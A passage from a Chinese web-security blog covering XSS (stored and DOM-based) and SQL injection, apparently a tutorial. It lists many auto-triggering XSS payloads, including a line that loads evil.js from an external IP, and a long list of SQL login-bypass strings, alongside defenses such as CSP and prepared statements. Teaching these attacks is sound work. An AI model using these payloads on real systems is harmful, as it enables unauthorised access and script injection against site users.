<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>而这一条评论，又会被保存到数组或者是数据库当中(这个看 Web 程序的设计)，就造成了存储型 XSS。</p>
<ul>
<li>绕过手段不再逼逼，和反射型 XSS 是异曲同工。</li>
</ul>
<hr>
<h3 id="3-DOM-型-XSS-重点"><a href="#3-DOM-型-XSS-重点" class="headerlink" title="3. DOM 型 XSS(重点!)"></a>3. DOM 型 XSS(重点!)</h3><p>DOM 型的 XSS 是基于文档对象模型 Document Objeet Model，DOM)的一种漏洞。说白了就是那些标签，比如<code>img</code>​，<code>input</code>​等这种类型的 DOM 节点标签而已，而 DOM 型 XSS 打的就是这些。</p>
<blockquote>
<p>我个人觉得 DOM 型 XSS 与反射型，存储型 XSS 的区别可谓不是一点半点，虽然有人把 DOM 型 XSS 归结到反射型 XSS 当中，但是我们看下去，会感受到些许不同。</p>
</blockquote>
<p>DOM 型 XSS 全部都是由前端进行触发的。所以我们平常如果挖洞，还是很考验代码审计的耐心的。</p>
<ul>
<li>我们下面讲几种常见的攻击方式，在这之前，我们先把可以利用的 DOM 节点，以及其 Payload 拉出来。Payload 摘自<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1838791">HACK 师傅的文章</a></li>
</ul>
<h4 id="一些常用的标签与属性"><a href="#一些常用的标签与属性" class="headerlink" title="一些常用的标签与属性"></a><strong>一些常用的标签与属性</strong></h4><p>下面我列举的标签大部分是可以自动触发 js 代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发。</p>
<h5 id="scirpt-标签"><a href="#scirpt-标签" class="headerlink" title="scirpt 标签"></a><strong>scirpt 标签</strong></h5><p>​<code>&lt;script&gt;</code>​标签用于定义客户端脚本，比如 JavaScript。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h5 id="img-标签"><a href="#img-标签" class="headerlink" title="img 标签"></a><strong>img 标签</strong></h5><p>​<code>&lt;img&gt;</code>​标签定义 HTML 页面中的图像。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1);&gt;&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>

<h5 id="input-标签"><a href="#input-标签" class="headerlink" title="input 标签"></a><strong>input 标签</strong></h5><p>​<code>&lt;input&gt;</code>​标签规定了用户可以在其中输入数据的输入字段。<br>onfocus 事件在对象获得焦点时发生：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=alert(1);&gt;</span><br></pre></td></tr></table></figure>

<p>竞争焦点，从而触发 onblur 事件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onblur=alert(1) autofocus&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure>

<p>input 标签的 autofocus 属性规定当页面加载时<code>&lt;input&gt;</code>​元素应该自动获得焦点。可以通过 autofocus 属性自动执行本身的 focus 事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(1);&quot; autofocus&gt;</span><br></pre></td></tr></table></figure>

<h5 id="details-标签"><a href="#details-标签" class="headerlink" title="details 标签"></a><strong>details 标签</strong></h5><p>​<code>&lt;details&gt;</code>​标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭<code>&lt;details&gt;</code>​元素时触发：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=alert(1);&gt;</span><br></pre></td></tr></table></figure>

<p>使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=alert(1);&gt;</span><br></pre></td></tr></table></figure>

<h5 id="svg-标签"><a href="#svg-标签" class="headerlink" title="svg 标签"></a><strong>svg 标签</strong></h5><p>​<code>&lt;svg&gt;</code>​标签用来在HTML页面中直接嵌入SVG 文件的代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(1);&gt;</span><br></pre></td></tr></table></figure>

<h5 id="select-标签"><a href="#select-标签" class="headerlink" title="select 标签"></a><strong>select 标签</strong></h5><p>​<code>&lt;select&gt;</code>​标签用来创建下拉列表。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>

<p>通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1) autofocus&gt;</span><br></pre></td></tr></table></figure>

<h5 id="iframe-标签"><a href="#iframe-标签" class="headerlink" title="iframe 标签"></a><strong>iframe 标签</strong></h5><p>​<code>&lt;iframe&gt;</code>​标签会创建包含另外一个文档的内联框架。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(1);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<h5 id="video-标签"><a href="#video-标签" class="headerlink" title="video 标签"></a><strong>video 标签</strong></h5><p>​<code>&lt;video&gt;</code>​标签定义视频，比如电影片段或其他视频流。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video&gt;&lt;source onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h5 id="audio-标签"><a href="#audio-标签" class="headerlink" title="audio 标签"></a><strong>audio 标签</strong></h5><p>​<code>&lt;audio&gt;</code>​标签定义声音，比如音乐或其他音频流。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=x  onerror=alert(1);&gt;</span><br></pre></td></tr></table></figure>

<h5 id="body-标签"><a href="#body-标签" class="headerlink" title="body 标签"></a><strong>body 标签</strong></h5><p>​<code>&lt;body&gt;</code>​标签定义文档的主体。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=alert(1);&gt;</span><br></pre></td></tr></table></figure>

<p>onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及 autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;bodyonscroll=alert(1);&gt;&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure>

<h5 id="textarea-标签"><a href="#textarea-标签" class="headerlink" title="textarea 标签"></a><strong>textarea 标签</strong></h5><p>​<code>&lt;textarea&gt;</code>​标签定义一个多行的文本输入控件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea onfocus=alert(1); autofocus&gt;</span><br></pre></td></tr></table></figure>

<h5 id="keygen-标签"><a href="#keygen-标签" class="headerlink" title="keygen 标签"></a><strong>keygen 标签</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</span><br></pre></td></tr></table></figure>

<h5 id="marquee-标签"><a href="#marquee-标签" class="headerlink" title="marquee 标签"></a><strong>marquee 标签</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee onstart=alert(1)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</span><br></pre></td></tr></table></figure>

<h5 id="isindex-标签"><a href="#isindex-标签" class="headerlink" title="isindex 标签"></a><strong>isindex 标签</strong></h5><p>​<code>&lt;link&gt;</code>​标签定义文档与外部资源的关系。在无 CSP 的情况下才可以使用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=import href=&quot;http://47.xxx.xxx.72/evil.js&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="4-DOM-型-XSS-的利用"><a href="#4-DOM-型-XSS-的利用" class="headerlink" title="4. DOM 型 XSS 的利用"></a>4. DOM 型 XSS 的利用</h3><blockquote>
<p>和前文说的一样，各种 js 中捣鼓</p>
</blockquote>
<h4 id="1-jQuery-中的-DOM-型-XSS"><a href="#1-jQuery-中的-DOM-型-XSS" class="headerlink" title="(1) jQuery 中的 DOM 型 XSS"></a>(1) jQuery 中的 DOM 型 XSS</h4><p>有问题的代码如下图所示</p>
<p><img src="/.com//image-20250519171416-tmigybk.png" alt="image"></p>
<p>若为进行任意过滤的时候 Payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-利用遗留下的测试代码"><a href="#2-利用遗留下的测试代码" class="headerlink" title="(2) 利用遗留下的测试代码"></a>(2) 利用遗留下的测试代码</h4><p>不多扯了，详见 <a target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/05/05/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-07-XSS/#toc-heading-6">WebGoat代码审计-07-XSS 利用测试代码触发 DOM 型 XSS)</a></p>
<hr>
<h2 id="XSS-的实战应用"><a href="#XSS-的实战应用" class="headerlink" title="XSS 的实战应用"></a>XSS 的实战应用</h2><p>几种钓鱼，和 getshell<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8459">XSS 实战攻击思路总结</a><br><a target="_blank" rel="noopener" href="https://www.hacking8.com/bug-web/Wordpress/Wordpress-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%E4%BB%8Exss%E5%88%B0getshell--xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8.html">从xss到getshell–xss的深层次利用与探讨</a></p>
<hr>
<h2 id="CSRF-和-XSS-的区别"><a href="#CSRF-和-XSS-的区别" class="headerlink" title="CSRF 和 XSS 的区别"></a>CSRF 和 XSS 的区别</h2><p>1、CSRF是<strong>跨站请求伪造;</strong>   XSS是<strong>跨域脚本攻击</strong>。<br>2、CSRF需要用户先<strong>登录网站A,获取cookie;</strong>   XSS<strong>不需要登录</strong>。<br>3、CSRF是利用网站<strong>A本身的漏洞</strong>,去请<strong>求网站A的api;</strong>   XSS是向网站<strong>A注入JS代码</strong>,然后<strong>执行JS里的代码</strong>,<strong>篡改网站A的内容</strong>。（XSS利用的是<strong>站点内的信任用户</strong>，而CSRF则是<strong>通过伪装来自受信任用户的请求</strong>来<strong>利用受信任的网站</strong>。你可以这么理解CSRF攻击：<strong>攻击者盗用了你的身份，以你的名义向第三方网站发送恶意请求</strong>。）</p>
<hr>
<h2 id="XSS-的防御"><a href="#XSS-的防御" class="headerlink" title="XSS 的防御"></a>XSS 的防御</h2><ul>
<li>主要是两层：<br>一： 对输出端的<strong>数据进行编码</strong><br>二: <strong>验证输入</strong></li>
</ul>
<p>目前时间 2022 年 5 月，感觉 XSS 不像之前那么泛滥了。</p>
<h3 id="1-对输出端的数据进行编码"><a href="#1-对输出端的数据进行编码" class="headerlink" title="1. 对输出端的数据进行编码"></a>1. 对输出端的数据进行编码</h3><p>1）将一些<strong>字符进行转义</strong>，例如<code>&lt;</code>​，<code>&gt;</code>​进行转义<br>2）白名单，通过一些<strong>标签限制</strong><br>3）不要把<strong>后端传进来的数据</strong>直接作为 <strong>HTML 渲染</strong>，进行处理</p>
<h3 id="2-CSP-的应用"><a href="#2-CSP-的应用" class="headerlink" title="2. CSP 的应用"></a>2. CSP 的应用</h3><p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p>
<ul>
<li><strong>禁止加载外域代码</strong>，防止复杂的攻击逻辑。</li>
<li><strong>禁止内联脚本执行</strong>。</li>
<li><strong>禁止外域提交</strong>，网站被攻击后，用户的数据不会泄露到外域。</li>
<li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li>
</ul>
<h3 id="3-其他安全措施"><a href="#3-其他安全措施" class="headerlink" title="3. 其他安全措施"></a>3. 其他安全措施</h3><ul>
<li><strong>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie</strong>，攻击者完成 <strong>XSS 注入</strong>后也无法<strong>窃取此 Cookie</strong>。</li>
<li><strong>验证码：</strong> 防止脚本冒充用户提交危险操作。</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/05/20/Web/XSS/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1%20XSS/" data-id="cmawczpny001qik7k95ehbt45" data-title="从0到1完全掌握XSS" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web/注入漏洞/SQL注入/sql注入总结" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="article-date">
  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQL注入总结</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="sql注入总结"><a href="#sql注入总结" class="headerlink" title="sql注入总结"></a>sql注入总结</h1><h2 id="什么是-Sql-注入？"><a href="#什么是-Sql-注入？" class="headerlink" title="什么是 Sql 注入？"></a>什么是 Sql 注入？</h2><p>SQL 注入是比较常见的网络攻击方式之一，它不是利用操作系统的 BUG 来实现攻击，而是针对程序员编写时的疏忽，通过 SQL 语句，实现无账号登录，甚至篡改数据库。</p>
<p>由于以下的环境都是 MySQL 数据库，所以先了解点 MySQL 有关的知识。在 MySQL5.0 之后，MySQL 中默认添加了一个名为<code>information_schema</code>​的数据库，<u>该数据库中的表都是</u>​<u><strong>只读的</strong></u>​<u>，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个</u>​<u><strong>视图</strong></u>​<u>，不是</u>​<u><strong>基本表</strong></u>​<u>，</u>​<u><strong>没有关联的文件</strong></u>​<u>。</u></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql中注释符：#   、/**/ 、  --</span><br></pre></td></tr></table></figure>

<h4 id="information-schema-中三个很重要的表："><a href="#information-schema-中三个很重要的表：" class="headerlink" title="information_schema 中三个很重要的表："></a>information_schema 中三个很重要的表：</h4><ul>
<li>information_schema.<strong>schemata</strong>: 该数据表存储了 mysql 数据库中的所有数据库的<code>库名</code>​</li>
<li>information_schema.<strong>tables</strong>： 该数据表存储了 mysql 数据库中的所有数据表的<code>表名</code>​</li>
<li>information_schema.<strong>columns</strong>: 该数据表存储了 mysql 数据库中的所有列的<code>列名</code>​</li>
</ul>
<h2 id="Mysql-中常用的函数"><a href="#Mysql-中常用的函数" class="headerlink" title="Mysql 中常用的函数"></a>Mysql 中常用的函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">version():查询数据库的版本</span><br><span class="line">user():查询数据库的使用者</span><br><span class="line">database():数据库</span><br><span class="line">system_user():系统用户名</span><br><span class="line">session_user():连接数据库的用户名</span><br><span class="line">current_user():当前用户名</span><br><span class="line">load_file():读取本地文件</span><br><span class="line">@@datadir:读取数据库路径</span><br><span class="line">@@basedir:mysql安装路径</span><br><span class="line">@@version_complie_os:查看操作系统</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="判断-SQL-注入是否存在"><a href="#判断-SQL-注入是否存在" class="headerlink" title="判断 SQL 注入是否存在"></a>判断 SQL 注入是否存在</h2><ul>
<li>先加单引号<code>&#39;</code>​、双引号<code>&quot;</code>​、单括号<code>)</code>​、双括号<code>))</code>​等看看是否<strong>报错</strong>，如果报错就可能存在 SQL 注入漏洞了。</li>
<li>还有在 URL 后面加<code>and 1 = 1 、 and 1 = 2</code>​看页面是否显示一样，<strong>显示不一样</strong>的话，肯定存在 SQL 注入漏洞了。</li>
<li>还有就是<code>Timing Attack</code>​测试，也就是<code>时间盲注</code>​。有时候通过简单的条件语句比如 <strong>and 1&#x3D;2</strong> 是无法看出异常的。</li>
<li>在 MySQL 中，有一个<code>Benchmark()</code>​函数，它是用于<strong>测试性能</strong>的。<u>Benchmark(count,expr)，这个函数执行的结果，是将</u>​<u><strong>表达式expr执行count次</strong></u>​<u> 。</u></li>
</ul>
<p>因此，利用<code>benchmark函数</code>​，<u>可以让</u>​<u><strong>同一个函数执行若干次</strong></u>​<u>，使得结果返回的时间比平时要长，通过</u>​<u><strong>时间长短</strong></u>​<u>的变化，可以判断注入语句是否执行成功。</u>这是一种<strong>边信道攻击</strong>，这个技巧在盲注中被称为<code>Timing Attack</code>​，也就是<code>时间盲注</code>​。</p>
<p><strong>易出现 SQL 注入的功能点：</strong> 凡是和<code>数据库有交互</code>​的地方都容易出现 SQL 注入，SQL 注入经常出现在登陆页面、涉及获取 HTTP 头（<strong>user-agent &#x2F; client-ip</strong> 等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在 HTTP 头中的 <strong>client-ip</strong> 和 <strong>x-forward-for</strong> 等字段处。这些字段是用来记录<strong>登陆的 ip</strong> 的，有可能会被<strong>存储进数据库</strong>中从而与数据库发生交互导致 sql 注入。</p>
<h2 id="Sql-注入的分类"><a href="#Sql-注入的分类" class="headerlink" title="Sql 注入的分类"></a>Sql 注入的分类</h2><hr>
<table>
<thead>
<tr>
<th>分类依据</th>
<th>类型</th>
</tr>
</thead>
<tbody><tr>
<td>获取信息的方式</td>
<td>布尔盲注，时间盲注，报错注入 ，union查询注入，堆叠注入等</td>
</tr>
<tr>
<td>提交方式</td>
<td>GET、POST、COOKIE、HTTP 注入等</td>
</tr>
<tr>
<td>注入点类型</td>
<td>数字类型的注入、字符串类型的注入、搜索型注入等</td>
</tr>
<tr>
<td>其他注入</td>
<td>二次注入、User-Agent 注入、文件读写、宽字节注入 、万能密码 等</td>
</tr>
</tbody></table>
<hr>
<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原验证登陆语句:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE Username= &#x27;&quot;.$username.&quot;&#x27; AND Password= &#x27;&quot;.md5($password).&quot;&#x27;</span><br></pre></td></tr></table></figure>

<p>输入<code>1&#39; or 1=1 or &#39;1&#39;=&#39;1</code>​万能密码语句变为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE Username=&#x27;1&#x27; OR 1=1 OR &#x27;1&#x27;=&#x27;1&#x27; AND Password=&#x27;EDFKGMZDFSDFDSFRRQWERRFGGG&#x27;</span><br></pre></td></tr></table></figure>

<p>即得到优先级关系：<code>or&lt;and&lt;not</code>​，同一优先级默认从左往右计算。</p>
<ul>
<li>上面<code>&#39;1&#39;=&#39;1&#39; AND Password=&#39;EDFKGMZDFSDFDSFRRQWERRFGGG&#39;</code>​<strong>先计算</strong>肯定返回<code>false</code>​,因为密码是我们乱输入的。(此处是假)</li>
<li>Username=‘1’ 返回假，数据库没有1这个用户名(此处是假)</li>
<li>1=1返回真(此处是真)</li>
</ul>
<p>以上的结果是:<code>假 or 真 or假</code>​返回<code>真</code>​。验证通过。再比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select tel,pwd where tel=&#x27;111&#x27; and pwd=&#x27;123456&#x27;</span><br></pre></td></tr></table></figure>

<p>我们把电话111看成一个变量，输入电话号码为<code>&#39; or 1= &#39;1</code>​。</p>
<p>sql就变为如下样子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select  tel,pwd where tel=&#x27;&#x27; or 1=&#x27;1&#x27; and pwd=&#x27;123456&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>上面<code>1=&#39;1&#39; and pwd=&#39;123456&#39;</code>​<strong>先计算</strong>肯定返回<code>false</code>​。(此处是假)</li>
<li>tel=‘’ 返回假，数据库没有<code>&#39;&#39;</code>​这个手机号。(此处是假)</li>
</ul>
<p>以上的结果是:<code>真 or假</code>​返回<code>真</code>​。验证通过。</p>
<h3 id="常用的万能密码"><a href="#常用的万能密码" class="headerlink" title="常用的万能密码"></a>常用的万能密码</h3><hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=&#x27;1</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">admin</span><br><span class="line">admin&#x27;--</span><br><span class="line">admin&#x27; or 4=4--</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--</span><br><span class="line">admin888</span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">admin&#x27; or 2=2#</span><br><span class="line">a&#x27; having 1=1#</span><br><span class="line">a&#x27; having 1=1--</span><br><span class="line">admin&#x27; or &#x27;2&#x27;=&#x27;2</span><br><span class="line">&#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">or 4=4--</span><br><span class="line">c</span><br><span class="line">a&#x27;or&#x27; 4=4--</span><br><span class="line">&quot;or 4=4--</span><br><span class="line">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27; or 4=4</span><br><span class="line">&#x27;OR 4=4%00</span><br><span class="line">&quot;or 4=4%00</span><br><span class="line">&#x27;xor</span><br><span class="line">admin&#x27; UNION Select 1,1,1 FROM admin Where &#x27;&#x27;=&#x27;</span><br><span class="line">1</span><br><span class="line">-1%cf&#x27; union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">1</span><br><span class="line">17..admin&#x27; or &#x27;a&#x27;=&#x27;a 密码随便</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;or 4=4/*</span><br><span class="line">something</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">admin&#x27; OR 4=4/*</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Sql-注入的预防"><a href="#Sql-注入的预防" class="headerlink" title="Sql 注入的预防"></a>Sql 注入的预防</h2><p><u>一般在项目中我们不太会去注意 SQL 注入的问题</u>，因为我们会使用 <strong>ORM</strong>，而 ORM 在实现的过程中也会帮我做 SQL 注入过滤；但有的时候 ORM 没法满足我们的需求，这时可能就会手撸原生 SQL 来执行</p>
<h3 id="预编译-PreparedStatement-JSP"><a href="#预编译-PreparedStatement-JSP" class="headerlink" title="预编译(PreparedStatement)(JSP)"></a>预编译(PreparedStatement)(JSP)</h3><hr>
<p>可以采用预编译语句集，它内置了处理SQL注入的能力，只要使用它的setXXX方法传值即可。</p>
